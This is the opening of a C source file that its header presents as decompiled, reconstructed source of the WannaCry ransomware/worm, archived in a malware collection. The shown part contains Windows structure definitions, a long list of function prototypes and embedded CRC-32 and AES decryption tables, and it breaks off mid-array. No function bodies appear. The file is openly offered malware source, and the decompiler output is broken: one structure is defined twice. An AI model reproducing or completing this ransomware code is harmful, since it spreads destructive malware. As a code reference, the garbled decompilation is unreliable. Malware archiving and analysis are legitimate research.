/*
  name      WannaCry
  type      ransomware/worm
  cve       MS17-010 / CVE-2017-0144
  year      2017
  os        windows
  authors   Lazarus Group / DPRK (attributed)
  source    binary from https://github.com/Explodingstuff/WannaCry
  archived  krisyotam
  notes     decompiled by krisyotam using retdec v5.0 with Claude Sonnet 4.6; reconstructed C from PE32 binary
 */

#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <wchar.h>
#include <windows.h>

// ------------------------ Structures ------------------------

struct _EXCEPTION_RECORD {
    int32_t e0;
    int32_t e1;
    struct _EXCEPTION_RECORD * e2;
    int32_t * e3;
    int32_t e4;
    int32_t e5[1];
};

struct _FILETIME {
    int32_t e0;
    int32_t e1;
};

struct _IO_FILE {
    int32_t e0;
};

struct _LARGE_INTEGER {
    int64_t e0;
};

struct _LIST_ENTRY {
    struct _LIST_ENTRY * e0;
    struct _LIST_ENTRY * e1;
};

struct _LIST_ENTRY {
    struct _LIST_ENTRY * e0;
    struct _LIST_ENTRY * e1;
};

struct _M128A {
    int32_t e0;
    int64_t e1;
};

struct _CONTEXT {
    int32_t e0;
    int32_t e1;
    int32_t e2;
    int32_t e3;
    int32_t e4;
    int32_t e5;
    int32_t e6;
    int32_t e7;
    int16_t e8;
    int16_t e9;
    int16_t e10;
    int16_t e11;
    int16_t e12;
    int16_t e13;
    int32_t e14;
    int32_t e15;
    int32_t e16;
    int32_t e17;
    int32_t e18;
    int32_t e19;
    int32_t e20;
    int32_t e21;
    int32_t e22;
    int32_t e23;
    int32_t e24;
    int32_t e25;
    int32_t e26;
    int32_t e27;
    int32_t e28;
    int32_t e29;
    int32_t e30;
    int32_t e31;
    int32_t e32;
    int32_t e33;
    int32_t e34;
    int32_t e35;
    int32_t e36;
    int32_t e37;
    int32_t e38;
    struct _M128A e39[26];
    int32_t e40;
    int32_t e41;
    int32_t e42;
    int32_t e43;
    int32_t e44;
    int32_t e45;
};

struct _OVERLAPPED {
    int32_t e0;
    int32_t e1;
    int32_t e2;
    int32_t * e3;
};

struct _PROCESS_INFORMATION {
    int32_t * e0;
    int32_t * e1;
    int32_t e2;
    int32_t e3;
};

struct _RTL_CRITICAL_SECTION {
    struct _RTL_CRITICAL_SECTION_DEBUG * e0;
    int32_t e1;
    int32_t e2;
    int32_t * e3;
    int32_t * e4;
    int32_t e5;
};

struct _RTL_CRITICAL_SECTION_DEBUG {
    int16_t e0;
    int16_t e1;
    struct _RTL_CRITICAL_SECTION * e2;
    struct _LIST_ENTRY e3;
    int32_t e4;
    int32_t e5;
    int32_t e6;
    int16_t e7;
    int16_t e8;
};

struct _SECURITY_ATTRIBUTES {
    int32_t e0;
    int32_t * e1;
    bool e2;
};

struct _STARTUPINFOA {
    int32_t e0;
    char * e1;
    char * e2;
    char * e3;
    int32_t e4;
    int32_t e5;
    int32_t e6;
    int32_t e7;
    int32_t e8;
    int32_t e9;
    int32_t e10;
    int32_t e11;
    int16_t e12;
    int16_t e13;
    char * e14;
    int32_t * e15;
    int32_t * e16;
    int32_t * e17;
};

struct _SYSTEMTIME {
    int16_t e0;
    int16_t e1;
    int16_t e2;
    int16_t e3;
    int16_t e4;
    int16_t e5;
    int16_t e6;
    int16_t e7;
};

// ------------------------- Classes --------------------------

// .?AVtype_info@@

// ------------------- Function Prototypes --------------------

int32_t ??1?$_Mpunct@D@std@@MAE@XZ(void);
int32_t ??1?$_Mpunct@D@std@@MAE@XZ2(void);
int32_t ??1type_info@@UAE@XZ(void);
int32_t ??3@YAXPAX@Z(int32_t * a1);
int32_t _3f__3f_1_3f__24__Mpunct_40_D_40_std_40__40_MAE_40_XZ(void);
int32_t __controlfp(int32_t NewValue, int32_t Mask);
int32_t entry_point(void);
int32_t function_401000(int32_t * data, int32_t a2);
int32_t function_401064(int32_t * lpCommandLine, int32_t dwMilliseconds, int32_t a3);
int32_t function_4010fd(int32_t a1);
int32_t function_401225(int32_t * a1);
int32_t function_4012fd(void);
int32_t function_4013ce(int32_t a1, int32_t a2);
int32_t function_401437(int32_t a1, int32_t a2);
int32_t function_4014a6(int32_t lpFileName, int32_t a2);
int32_t function_4016e1(void);
int32_t function_4016f9(int32_t a1, int32_t a2, int32_t a3);
int32_t function_40170a(void);
int32_t function_4017dd(void);
int32_t function_40182c(int32_t a1);
int32_t function_401861(int32_t a1);
int32_t function_4018b9(void);
int32_t function_4018f9(int32_t a1, int32_t a2, int32_t lpFileName);
int32_t function_4019b1(void);
int32_t function_4019d2(int32_t a1, int32_t a2, int32_t a3);
int32_t function_4019e1(int32_t a1, int32_t a2, int32_t * a3, int32_t * a4);
int32_t function_401a45(int32_t a1, int32_t a2);
int32_t function_401af6(int16_t * lpPathName, int16_t * lpPathName2, int32_t wstr);
int32_t function_401b5f(int32_t a1);
int32_t function_401ce8(int32_t * a1);
int32_t function_401dab(int32_t a1, int32_t a2);
int32_t function_401e9e(void);
int32_t function_401eff(uint32_t a1);
int32_t function_401f5d(void);
int32_t function_401fe7(int32_t a1);
int32_t function_40216e(int32_t lpAddress, int32_t dwSize, int32_t flAllocationType, int32_t flProtect);
int32_t function_402185(int32_t lpAddress, int32_t dwSize, int32_t dwFreeType);
int32_t * function_402198(char * lpLibFileName);
int32_t (*function_4021a3(int32_t * hModule, char * lpProcName))();
bool function_4021b2(int32_t * hLibModule);
int32_t function_4021bd(int32_t a1, int32_t a2);
int32_t function_4021e9(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7, int32_t a8);
int32_t function_402457(uint32_t a1, uint32_t a2);
int32_t function_402470(int32_t a1, int32_t a2, int32_t a3, int32_t a4);
int32_t function_40254b(int32_t a1);
int32_t function_40264f(int32_t a1, int32_t a2);
int32_t function_40267b(int32_t a1, int32_t a2);
int32_t function_40271d(int32_t a1);
int32_t function_402758(int32_t a1, int32_t a2);
int32_t function_4027df(int32_t a1);
int32_t function_402924(int32_t a1, uint32_t a2);
int32_t function_4029cc(int32_t a1);
int32_t function_402a46(void);
int32_t function_402a76(int32_t * a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6);
int32_t function_402e7e(int32_t a1, int32_t result);
int32_t function_4031bc(int32_t a1, int32_t result);
int32_t function_40350f(int32_t a1, int32_t a2);
int32_t function_403797(int32_t a1, int32_t a2);
int32_t function_403a28(int32_t a1, int32_t a2);
int32_t function_403a77(int32_t a1, int32_t a2, uint32_t a3, int32_t a4);
int32_t function_403bd6(int32_t a1, int32_t a2, int32_t a3);
int32_t function_403cc8(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t result);
int32_t function_403cfc(int32_t a1, int32_t a2, int32_t a3);
int32_t function_4042af(int32_t a1, int32_t result);
int32_t function_4042c0(int32_t a1, int32_t a2, int32_t a3);
int32_t function_40432b(int32_t a1, int32_t a2, int32_t a3);
int32_t function_4043b6(int32_t a1, int32_t a2);
int32_t function_404be5(int32_t a1, int32_t a2, int32_t a3);
int32_t function_404c19(int32_t a1, uint32_t a2, uint32_t a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7, int32_t a8, int32_t * a9, int32_t a10);
int32_t function_404fa0(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5);
int32_t function_40501f(uint32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7, int32_t a8, int32_t a9);
int32_t function_405122(int32_t a1, int32_t a2, int32_t a3, int32_t a4);
int32_t function_40514d(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6);
int32_t function_40541f(int32_t a1, int32_t a2, uint32_t a3);
int32_t function_405535(int32_t a1, unsigned char a2);
int32_t function_405588(int32_t a1);
int32_t function_4055a3(int32_t a1, int32_t a2);
int32_t function_4055c4(uint32_t a1, int32_t a2, int32_t a3);
int32_t function_4056dd(int32_t nmemb, int32_t size);
void function_4056ee(int32_t * ptr);
int32_t function_4056fa(int32_t a1);
int32_t function_405739(int32_t a1);
int32_t function_405777(int32_t a1);
int32_t function_40583c(int32_t a1, int32_t a2);
int32_t function_405bae(int32_t lpFileName, int32_t a2, int32_t a3, int32_t a4);
int32_t function_405c9f(int32_t a1);
int32_t function_405cc7(int32_t a1);
int32_t function_405cdd(int32_t a1);
int32_t function_405d0e(int32_t a1, int32_t a2, int32_t a3);
int32_t function_405d8a(int32_t * lpBuffer, uint32_t a2, int32_t a3, int32_t a4);
int32_t function_405def(int32_t a1, int32_t * a2);
int32_t function_405e27(int32_t a1, int32_t * a2);
int32_t function_405e6b(int32_t a1, int32_t * a2);
int32_t function_405edf(int32_t a1);
int32_t function_405fe2(int32_t a1);
int32_t function_406162(int32_t a1);
int32_t function_406191(uint32_t a1, int32_t * a2);
int32_t function_4061e0(int32_t a1, int32_t a2, int32_t a3, int32_t a4, uint32_t a5, int32_t a6, uint32_t a7, int32_t a8, uint32_t a9);
int32_t function_4064bb(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7, int32_t a8);
int32_t function_4064e2(int32_t a1);
int32_t function_406520(int32_t a1);
int32_t function_40657a(int32_t a1, int32_t * a2, int32_t * a3, int32_t * a4);
int32_t function_40671d(int32_t a1, int32_t a2);
int32_t function_406880(int32_t a1, int32_t a2, uint32_t a3, int32_t a4);
int32_t function_406a97(int32_t a1);
int32_t function_406b02(uint32_t a1);
int32_t function_406b23(uint32_t a1, int32_t a2);
int32_t function_406b8e(int32_t hFile, int32_t a2, int32_t a3);
int32_t function_406c40(int32_t a1, int32_t a2, int32_t a3);
int32_t function_407070(int32_t a1, int32_t a2);
int32_t function_407136(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6);
int32_t function_40747b(void);
int32_t function_4074a4(int32_t a1, int32_t a2, int32_t a3, int32_t a4);
int32_t function_407527(int32_t a1);
int32_t function_407572(void);
int32_t function_4075ad(int32_t a1, int32_t a2, int32_t a3);
int32_t function_4075c4(int32_t a1, int32_t a2, int32_t * a3);
int32_t function_407603(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5);
int32_t function_40763d(int32_t a1, int32_t a2, int32_t a3);
int32_t function_407656(int32_t a1);
char * function_4076a8(char * dest, char * src);
int32_t * function_4076ae(int32_t * s, int32_t c, int32_t n);
int32_t function_4076b4(char * s);
int32_t function_4076c0(int32_t * pExcept, int32_t * pRN, int32_t * pContext, int32_t * pDC);
int32_t function_4076c8(int32_t result);
int32_t function_4076ee(int32_t * s1, int32_t * s2, int32_t n);
int32_t function_4076f4(struct _EXCEPTION_RECORD * exception_record, int32_t registration, struct _CONTEXT * context, int32_t dispatcher);
void function_4076fa(int32_t xr, int32_t stop);
int32_t function_407700(int32_t a1);
int32_t * function_407706(int32_t * dest, int32_t * src, int32_t n);
int32_t function_407710(int32_t result);
int32_t function_407740(char * s1, char * s2);
int32_t function_407746(int32_t * a1);
int32_t function_407768(void);
void function_40776e(int32_t * pExceptionObject, int32_t * pThrowInfo);
char * function_4077b4(char * dest, char * src);
int32_t function_4078f8(void);
int32_t function_40791e(int32_t xcptnum, int32_t * pxcptinfoptrs);
void function_407924(void (**First)(), void (**Last)());
int32_t function_40793c(void);
int32_t function_40793f(void);
int32_t function_407950(void);
int32_t function_40795b(void);
int32_t function_407966(void);
int32_t function_407970(void);
int32_t function_40797b(void);
int32_t function_407986(void);
int32_t function_407991(void);
int32_t function_40799c(void);
int32_t function_4079a6(void);

// --------------------- Global Variables ---------------------

// Detected cryptographic pattern: CRC_32_IEEE_802_3_poly_0x04C11DB7 (32-bit, little endian)
int32_t CRC_32_IEEE_802_3_poly_0x04C11DB7_at_40d054[256] = {0, 0x77073096, -0x11f19ed4, -0x66f6ae46, 0x76dc419, 0x706af48f, -0x169c5acb, -0x619b6a5d, 0xedb8832, 0x79dcb8a4, -0x1f2a16e2, -0x682d2678, 0x9b64c2b, 0x7eb17cbd, -0x1847d2f9, -0x6f40e26f, 0x1db71064, 0x6ab020f2, -0xc468eb8, -0x7b41be22, 0x1adad47d, 0x6ddde4eb, -0xb2b4aaf, -0x7c2c7a39, 0x136c9856, 0x646ba8c0, -0x29d0686, -0x759a3614, 0x14015c4f, 0x63066cd9, -0x5f0c29d, -0x72f7f20b, 0x3b6e20c8, 0x4c69105e, -0x2a9fbe1c, -0x5d988e8e, 0x3c03e4d1, 0x4b04d447, -0x2df27a03, -0x5af54a95, 0x35b5a8fa, 0x42b2986c, -0x2444362a, -0x534306c0, 0x32d86ce3, 0x45df5c75, -0x2329f231, -0x542ec2a7, 0x26d930ac, 0x51de003a, -0x3728ae80, -0x402f9eea, 0x21b4f4b5, 0x56b3c423, -0x30456a67, -0x47425af1, 0x2802b89e, 0x5f058808, -0x39f3264e, -0x4ef416dc, 0x2f6f7c87, 0x58684c11, -0x3e9ee255, -0x4999d2c3, 0x76dc4190, 0x1db7106, -0x672ddf44, -0x102aefd6, 0x71b18589, 0x6b6b51f, -0x60401b5b, -0x17472bcd, 0x7807c9a2, 0xf00f934, -0x69f65772, -0x1ef167e8, 0x7f6a0dbb, 0x86d3d2d, -0x6e9b9369, -0x199ca3ff, 0x6b6b51f4, 0x1c6c6162, -0x7a9acf28, -0xd9dffb2, 0x6c0695ed, 0x1b01a57b, -0x7df70b3f, -0xaf03ba9, 0x65b0d9c6, 0x12b7e950, -0x74414716, -0x3467784, 0x62dd1ddf, 0x15da2d49, -0x732c830d, -0x42bb39b, 0x4db26158, 0x3ab551ce, -0x5c43ff8c, -0x2b44cf1e, 0x4adfa541, 0x3dd895d7, -0x5b2e3b93, -0x2c290b05, 0x4369e96a, 0x346ed9fc, -0x529877ba, -0x259f4730, 0x44042d73, 0x33031de5, -0x55f5b3a1, -0x22f28337, 0x5005713c, 0x270241aa, -0x41f4eff0, -0x36f3df7a, 0x5768b525, 0x206f85b3, -0x46992bf7, -0x319e1b61, 0x5edef90e, 0x29d9c998, -0x4f2f67de, -0x3828574c, 0x59b33d17, 0x2eb40d81, -0x4842a3c5, -0x3f459353, -0x12477ce0, -0x65404c4a, 0x3b6e20c, 0x74b1d29a, -0x152ab8c7, -0x622d8851, 0x4db2615, 0x73dc1683, -0x1c9cf4ee, -0x6b9bc47c, 0xd6d6a3e, 0x7a6a5aa8, -0x1bf130f5, -0x6cf60063, 0xa00ae27, 0x7d079eb1, -0xff06cbc, -0x78f75c2e, 0x1e01f268, 0x6906c2fe, -0x89da8a3, -0x7f9a9835, 0x196c3671, 0x6e6b06e7, -0x12be48a, -0x762cd420, 0x10da7a5a, 0x67dd4acc, -0x6462091, -0x71411007, 0x17b7be43, 0x60b08ed5, -0x29295c18, -0x5e2e6c82, 0x38d8c2c4, 0x4fdff252, -0x2e44980f, -0x5943a899, 0x3fb506dd, 0x48b2364b, -0x27f2d426, -0x50f5e4b4, 0x36034af6, 0x41047a60, -0x209f103d, -0x579820ab, 0x316e8eef, 0x4669be79, -0x349e4c74, -0x43997ce6, 0x256fd2a0, 0x5268e236, -0x33f3886b, -0x44f4b8fd, 0x220216b9, 0x5505262f, -0x3a45c442, -0x4d42f4d8, 0x2bb45a92, 0x5cb36a04, -0x3d280059, -0x4a2f30cf, 0x2cd99e8b, 0x5bdeae1d, -0x649b3d50, -0x139c0dda, 0x756aa39c, 0x26d930a, -0x63f6f957, -0x14f1c9c1, 0x72076785, 0x5005713, -0x6a40b57e, -0x1d4785ec, 0x7bb12bae, 0xcb61b38, -0x6d2d7165, -0x1a2a41f3, 0x7cdcefb7, 0xbdbdf21, -0x792c2d2c, -0xe2b1dbe, 0x68ddb3f8, 0x1fda836e, -0x7e41e933, -0x946d9a5, 0x6fb077e1, 0x18b74777, -0x77f7a51a, -0xf09590, 0x66063bca, 0x11010b5c, -0x709a6101, -0x79d5197, 0x616bffd3, 0x166ccf45, -0x5ff51d88, -0x28f22d12, 0x4e048354, 0x3903b3c2, -0x5898d99f, -0x2f9fe909, 0x4969474d, 0x3e6e77db, -0x512e95b6, -0x2629a524, 0x40df0b66, 0x37d83bf0, -0x564351ad, -0x2144613b, 0x47b2cf7f, 0x30b5ffe9, -0x42420de4, -0x35453d76, 0x53b39330, 0x24b4a3a6, -0x452fc9fb, -0x3228f96d, 0x54de5729, 0x23d967bf, -0x4c9985d2, -0x3b9eb548, 0x5d681b02, 0x2a6f2b94, -0x4bf441c9, -0x3cf3715f, 0x5a05df1b, 0x2d02ef8d}; // 0x40d054
// Detected cryptographic pattern: Rijndael_Td0__0x51f4a750U_ (32-bit, little endian)
int32_t Rijndael_Td0__0x51f4a750U__at_409bfc[256] = {0x51f4a750, 0x7e416553, 0x1a17a4c3, 0x3a275e96, 0x3bab6bcb, 0x1f9d45f1, -0x5305a755, 0x4be30393, 0x2030fa55, -0x5289920a, -0x7733896f, -0xafdb3db, 0x4fe5d7fc, -0x3ad53429, 0x26354480, -0x4a9d5c71, -0x214ea5b7, 0x25ba1b67, 0x45ea0e98, 0x5dfec0e1, -0x3cd08afe, -0x7eb30fee, -0x72b9685d, 0x6bd3f9c6, 0x38f5fe7, 0x15929c95, -0x40928515, -0x6aada626, -0x2b417cd3, 0x587421d3, 0x49e06929, -0x713637bc, 0x75c2896a, -0xb718688, -0x66a7c195, 0x27b971dd, -0x411eb04a, -0xf7752e9, -0x36df539a, 0x7dce3ab4, 0x63df4a18, -0x1ae5ce7e, -0x68aecca0, 0x62537f45, -0x4e9b8820, -0x4494517c, -0x17e5fe4, -0x6f7d46c, 0x70486858, -0x70ba02e7, -0x6b219379, 0x527bf8b7, -0x548c2cdd, 0x724b02e2, -0x1ce070a9, 0x6655ab2a, -0x4d14d7f9, 0x2fb5c203, -0x793a8466, -0x2cc8f75b, 0x302887f2, 0x23bfa5b2, 0x2036aba, -0x12e97da4, -0x7530e3d5, -0x58864b6e, -0xcf80d10, 0x4e69e2a1, 0x65daf4cd, 0x605bed5, -0x2ecb9de1, -0x3b590176, 0x342e539d, -0x5d0caa60, 0x58ae132, -0x5b09148b, 0xb83ec39, 0x4060efaa, 0x5e719f06, -0x4291efaf, 0x3e218af9, -0x6922f9c3, -0x22c1fa52, 0x4de6bd46, -0x6eab724b, 0x71c45d05, 0x406d46f, 0x605015ff, 0x1998fb24, -0x29421669, -0x76bfbc34, 0x67d99e77, -0x4f17bd43, 0x7898b88, -0x18e6a4c8, 0x79c8eedb, -0x5e83f5b9, 0x7c420fe9, -0x77be137, 0, 0x9808683, 0x322bed48, 0x1e1170ac, 0x6c5a724e, -0x2f10005, 0xf853856, 0x3daed51e, 0x362d3927, 0xa0fd964, 0x685ca621, -0x64a4ab2f, 0x24362e3a, 0xc0a67b1, -0x6ca818f1, -0x4b11692e, 0x1b9b919e, -0x7f3f3ab1, 0x61dc20a2, 0x5a774b69, 0x1c121a16, -0x1d6c45f6, -0x3f5fd51b, 0x3c22e043, 0x121b171d, 0xe090d0b, -0xd743853, 0x2db6a8b9, 0x141ea9c8, 0x57f11985, -0x508af8b4, -0x11662245, -0x5c809f03, -0x8fed961, 0x5c72f5bc, 0x44663bc5, 0x5bfb7e34, -0x74bcd68a, -0x34dc3924, -0x49120398, -0x471b0e9d, -0x28ce2336, 0x42638510, 0x13972240, -0x7b39eee0, -0x7ab5db83, -0x2d44c208, -0x5106cdef, -0x38d65e93, 0x1d9e2f4b, -0x234dcf0d, 0xd8652ec, 0x77c1e3d0, 0x2bb3166c, -0x568f4667, 0x119448fa, 0x47e96422, -0x5703733c, -0x5f0fc0e6, 0x567d2cd8, 0x223390ef, -0x78b6b139, -0x26c72e3f, -0x73355d02, -0x672bf4ca, -0x590a7e31, -0x5a8521d8, -0x254871da, 0x3fadbfa4, 0x2c3a9de4, 0x5078920d, 0x6a5fcc9b, 0x547e4662, -0x972ec3e, -0x6f274718, 0x2e39f75e, -0x7d3c500b, -0x60a27f42, 0x69d0937c, 0x6fd52da9, -0x30daed4d, -0x375366c5, 0x10187da7, -0x17639c92, -0x24c44485, -0x32d987f7, 0x6e5918f4, -0x136548ff, -0x7cb06558, -0x196a919b, -0x55001982, 0x21bccf08, -0x10ea171a, -0x45186427, 0x4a6f36ce, -0x1560f62c, 0x29b07cd6, 0x31a4b2af, 0x2a3f2331, -0x395a6bd0, 0x35a266c0, 0x744ebc37, -0x37d355a, -0x1f6f2f50, 0x33a7d815, -0xefb67b6, 0x41ecdaf7, 0x7fcd500e, 0x1791f62f, 0x764dd68d, 0x43efb04d, -0x3355b2ac, -0x1b69fb21, -0x612e4a1d, 0x4c6a881b, -0x3ed3e048, 0x4665517f, -0x62a115fc, 0x18c355d, -0x5788b8d, -0x4f4bed2, -0x4c98e2a6, -0x6d242dae, -0x16efa9cd, 0x6dd64713, -0x65289e74, 0x37a10c7a, 0x59f8148e, -0x14ecc377, -0x3156d812, -0x489e36cb, -0x1ee31a13, 0x7a47b13c, -0x632d20a7, 0x55f2733f, 0x1814ce79, 0x73c737bf, 0x53f7cdea, 0x5ffdaa5b, -0x20c290ec, 0x7844db86, -0x35500c7f, -0x46973bc2, 0x3824342c, -0x3d5cbfa1, 0x161dc372, -0x431ddaf4, 0x283c498b, -0xf26abf, 0x39a80171, 0x80cb3de, -0x274b1b64, 0x6456c190, 0x7bcb8461, -0x2acd4990, 0x486c5c74, -0x2f47a8be}; // 0x409bfc
// Detected cryptographic pattern: Rijndael_Td1__0x5051f4a7U_ (32-bit, little endian)
int32_t Rijndael_Td1__0x5051f4a7U__at_409ffc[256] = {0x5051f4a7, 0x537e4165, -0x3ce5e85c, -0x69c5d8a2, -0x34c45495, -0xee062bb, -0x545305a8, -0x6cb41cfd, 0x552030fa, -0x9528993, -0x6e77338a, 0x25f5024c, -0x3b01a29, -0x283ad535, -0x7fd9cabc, -0x704a9d5d, 0x49deb15a, 0x6725ba1b, -0x67ba15f2, -0x1ea20140, 0x2c32f75, 0x12814cf0, -0x5c72b969, -0x39942c07, -0x18fc70a1, -0x6aea6d64, -0x14409286, -0x256aada7, 0x2dd4be83, -0x2ca78bdf, 0x2949e069, 0x448ec9c8, 0x6a75c289, 0x78f48e79, 0x6b99583e, -0x22d8468f, -0x49411eb1, 0x17f088ad, 0x66c920ac, -0x4b8231c6, 0x1863df4a, -0x7d1ae5cf, 0x60975133, 0x4562537f, -0x1f4e9b89, -0x7b449452, 0x1cfe81a0, -0x6b06f7d5, 0x58704868, 0x198f45fd, -0x786b2194, -0x48ad8408, 0x23ab73d3, -0x1d8db4fe, 0x57e31f8f, 0x2a6655ab, 0x7b2eb28, 0x32fb5c2, -0x65793a85, -0x5a2cc8f8, -0xdcfd779, -0x4ddc405b, -0x45fdfc96, 0x5ced1682, 0x2b8acf1c, -0x6d58864c, -0xf0cf80e, -0x5eb1961e, -0x329a250c, -0x2af9fa42, 0x1fd13462, -0x753b5902, -0x62cbd1ad, -0x5f5d0cab, 0x32058ae1, 0x75a4f6eb, 0x390b83ec, -0x55bf9f11, 0x65e719f, 0x51bd6e10, -0x6c1de76, 0x3d96dd06, -0x5122c1fb, 0x464de6bd, -0x4a6eab73, 0x571c45d, 0x6f0406d4, -0x9fafeb, 0x241998fb, -0x68294217, -0x3376bfbd, 0x7767d99e, -0x424f17be, -0x77f87675, 0x38e7195b, -0x24863712, 0x47a17c0a, -0x1683bdf1, -0x36077be2, 0, -0x7cf67f7a, 0x48322bed, -0x53e1ee90, 0x4e6c5a72, -0x402f101, 0x560f8538, 0x1e3daed5, 0x27362d39, 0x640a0fd9, 0x21685ca6, -0x2e64a4ac, 0x3a24362e, -0x4ef3f599, 0xf9357e7, -0x2d4b116a, -0x61e4646f, 0x4f80c0c5, -0x5d9e23e0, 0x695a774b, 0x161c121a, 0xae293ba, -0x1a3f5fd6, 0x433c22e0, 0x1d121b17, 0xb0e090d, -0x520d7439, -0x46d24958, -0x37ebe157, -0x7aa80ee7, 0x4caf7507, -0x44116623, -0x25c80a0, -0x6008feda, -0x43a38d0b, -0x3abb99c5, 0x345bfb7e, 0x768b4329, -0x2334dc3a, 0x68b6edfc, 0x63b8e4f1, -0x3528ce24, 0x10426385, 0x40139722, 0x2084c611, 0x7d854a24, -0x72d44c3, 0x11aef932, 0x6dc729a1, 0x4b1d9e2f, -0xc234dd0, -0x13f279ae, -0x2f883e1d, 0x6c2bb316, -0x66568f47, -0x5ee6bb8, 0x2247e964, -0x3b570374, 0x1aa0f03f, -0x27a982d4, -0x10ddcc70, -0x3878b6b2, -0x3e26c72f, -0x173355e, 0x3698d40b, -0x30590a7f, 0x28a57ade, 0x26dab78e, -0x5bc05241, -0x1bd3c563, 0xd507892, -0x6495a034, 0x62547e46, -0x3d0972ed, -0x176f2748, 0x5e2e39f7, -0xa7d3c51, -0x4160a280, 0x7c69d093, -0x56902ad3, -0x4c30daee, 0x3bc8ac99, -0x58efe783, 0x6ee89c63, 0x7bdb3bbb, 0x9cd2678, -0xb91a6e8, 0x1ec9ab7, -0x577cb066, 0x65e6956e, 0x7eaaffe6, 0x821bccf, -0x1910ea18, -0x26451865, -0x31b590ca, -0x2b1560f7, -0x29d64f84, -0x50ce5b4e, 0x312a3f23, 0x30c6a594, -0x3fca5d9a, 0x37744ebc, -0x59037d36, -0x4f1f6f30, 0x1533a7d8, 0x4af10498, -0x8be1326, 0xe7fcd50, 0x2f1791f6, -0x7289b22a, 0x4d43efb0, 0x54ccaa4d, -0x201b69fc, -0x1c612e4b, 0x1b4c6a88, -0x473ed3e1, 0x7f466551, 0x49d5eea, 0x5d018c35, 0x73fa8774, 0x2efb0b41, 0x5ab3671d, 0x5292dbd2, 0x33e91056, 0x136dd647, -0x7365289f, 0x7a37a10c, -0x71a607ec, -0x7614ecc4, -0x113156d9, 0x35b761c9, -0x121ee31b, 0x3c7a47b1, 0x599cd2df, 0x3f55f273, 0x791814ce, -0x408c38c9, -0x15ac0833, 0x5b5ffdaa, 0x14df3d6f, -0x7987bb25, -0x7e35500d, 0x3eb968c4, 0x2c382434, 0x5fc2a340, 0x72161dc3, 0xcbce225, -0x74d7c3b7, 0x41ff0d95, 0x7139a801, -0x21f7f34d, -0x63274b1c, -0x6f9ba93f, 0x617bcb84, 0x70d532b6, 0x74486c5c, 0x42d0b857}; // 0x409ffc
// Detected cryptographic pattern: Rijndael_Td2__0xa75051f4U_ (32-bit, little endian)
int32_t Rijndael_Td2__0xa75051f4U__at_40a3fc[256] = {-0x58afae0c, 0x65537e41, -0x5b3ce5e9, 0x5e963a27, 0x6bcb3bab, 0x45f11f9d, 0x58abacfa, 0x3934be3, -0x5aadfd0, 0x6df6ad76, 0x769188cc, 0x4c25f502, -0x2803b01b, -0x34283ad6, 0x44802635, -0x5c704a9e, 0x5a49deb1, 0x1b6725ba, 0xe9845ea, -0x3f1ea202, 0x7502c32f, -0xfed7eb4, -0x685c72ba, -0x639942d, 0x5fe7038f, -0x636aea6e, 0x7aebbf6d, 0x59da9552, -0x7cd22b42, 0x21d35874, 0x692949e0, -0x37bb7137, -0x76958a3e, 0x7978f48e, 0x3e6b9958, 0x71dd27b9, 0x4fb6bee1, -0x52e80f78, -0x539936e0, 0x3ab47dce, 0x4a1863df, 0x3182e51a, 0x33609751, 0x7f456253, 0x77e0b164, -0x517b4495, -0x5fe3017f, 0x2b94f908, 0x68587048, -0x2e670bb, 0x6c8794de, -0x748ad85, -0x2cdc548d, 0x2e2724b, -0x70a81ce1, -0x54d599ab, 0x2807b2eb, -0x3dfcd04b, 0x7b9a86c5, 0x8a5d337, -0x780dcfd8, -0x5a4ddc41, 0x6aba0203, -0x7da312ea, 0x1c2b8acf, -0x4b6d5887, -0xd0f0cf9, -0x1d5eb197, -0xb329a26, -0x412af9fb, 0x621fd134, -0x1753b5a, 0x539d342e, 0x55a0a2f3, -0x1ecdfa76, -0x148a5b0a, -0x13c6f47d, -0x1055bfa0, -0x60f9a18f, 0x1051bd6e, -0x7506c1df, 0x63d96dd, 0x5aedd3e, -0x42b9b21a, -0x724a6eac, 0x5d0571c4, -0x2b90fbfa, 0x15ff6050, -0x4dbe668, -0x16682943, 0x43cc8940, -0x61889827, 0x42bdb0e8, -0x7477f877, 0x5b38e719, -0x11248638, 0xa47a17c, 0xfe97c42, 0x1ec9f884, 0, -0x797cf680, -0x12b7cdd5, 0x70ac1e11, 0x724e6c5a, -0x402f2, 0x38560f85, -0x2ae1c252, 0x3927362d, -0x269bf5f1, -0x59de97a4, 0x54d19b5b, 0x2e3a2436, 0x67b10c0a, -0x18f06ca9, -0x692d4b12, -0x6e61e465, -0x3ab07f40, 0x20a261dc, 0x4b695a77, 0x1a161c12, -0x45f51d6d, 0x2ae5c0a0, -0x1fbcc3de, 0x171d121b, 0xd0b0e09, -0x38520d75, -0x5746d24a, -0x5637ebe2, 0x198557f1, 0x74caf75, -0x22441167, 0x60fda37f, 0x269ff701, -0xa43a38e, 0x3bc54466, 0x7e345bfb, 0x29768b43, -0x392334dd, -0x3974913, -0xe9c471c, -0x233528cf, -0x7aefbd9d, 0x22401397, 0x112084c6, 0x247d854a, 0x3df8d2bb, 0x3211aef9, -0x5e9238d7, 0x2f4b1d9e, 0x30f3dcb2, 0x52ec0d86, -0x1c2f883f, 0x166c2bb3, -0x46665690, 0x48fa1194, 0x642247e9, -0x733b5704, 0x3f1aa0f0, 0x2cd8567d, -0x6f10ddcd, 0x4ec78749, -0x2e3e26c8, -0x5d017336, 0xb3698d4, -0x7e30590b, -0x21d75a86, -0x71d92549, -0x405bc053, -0x621bd3c6, -0x6df2af88, -0x336495a1, 0x4662547e, 0x13c2f68d, -0x47176f28, -0x8a1d1c7, -0x500a7d3d, -0x7f4160a3, -0x6c839630, 0x2da96fd5, 0x12b3cf25, -0x66c43754, 0x7da71018, 0x636ee89c, -0x448424c5, 0x7809cd26, 0x18f46e59, -0x48fe1366, -0x65577cb1, 0x6e65e695, -0x19815501, -0x30f7de44, 